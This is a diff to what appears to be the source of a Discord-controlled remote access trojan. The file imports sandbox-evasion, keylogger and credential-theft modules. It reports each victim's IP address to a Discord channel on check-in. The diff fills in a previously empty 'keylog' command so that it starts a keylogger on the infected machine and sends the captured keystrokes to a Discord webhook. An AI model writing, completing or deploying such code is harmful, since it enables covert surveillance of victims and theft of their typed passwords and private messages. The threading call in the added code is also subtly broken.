@@ -1,6 +1,7 @@
 
 import os
 import sys
+import threading
 
 import discord
 from discord.ext import commands
@@ -8,12 +9,7 @@ from discord import app_commands
 
 from datetime import datetime
 
-from libraries import sandboxevasion, keylogger, maciassdopia
-
-
-# ========
-# Not finished
-# ========
+from libraries import sandboxevasion, keylogger, credentials, maciassdopia
 
 
 GUILD = discord.Object(id = "{GUILD}")
@@ -33,7 +29,6 @@ class BOT(commands.Bot):
         self.channel = self.get_channel(CHANNEL)
         now = datetime.now()
 
-        # Creating welcome message for new client
         my_embed = discord.Embed(title = f"{MSG}", description = f"**Time: {now.strftime('%d/%m/%y %H:%M:%S')}**", color = COLOR)
         my_embed.add_field(name = "**IP**", value = maciassdopia.getIP(), inline = True)
         my_embed.add_field(name = "**Bits**", value = maciassdopia.getBits(), inline = True)
@@ -546,14 +541,29 @@ async def killproc(ctx:commands.Context, pid:int):
         await ctx.reply(embed = my_embed)
 
 
-#=================================================================
-# Keylog need to be finished while keylogger.Keylogger is finished
-#=================================================================
 @bot.hybrid_command(name = "keylog", with_app_command = True)
 @app_commands.guilds(GUILD)
 async def keylog(ctx:commands.Context, mode:str, interval:int):
     if (int(CURRENT_AGENT) == int(ID)):
-        pass
+        logger = keylogger.Keylogger(
+            interval = interval,
+            ID = ID,
+            webhook = KEYLOG_WEBHOOK,
+            report_method = "webhook"
+        )
+        if mode == "stop":
+            logger.stop()
+            my_embed = discord.Embed(
+                title = f"Keylogger stopped on Agent#{ID}",
+                color = 0x00FF00
+            )
+        else:
+            threading.Thread(target = logger.start()).start()
+            my_embed = discord.Embed(
+                title = f"Keylogger started on Agent#{ID}",
+                color = 0x00FF00
+            )
+        await ctx.reply(embed = my_embed)
 
 
 @bot.hybrid_command(name = "help", with_app_command = True)
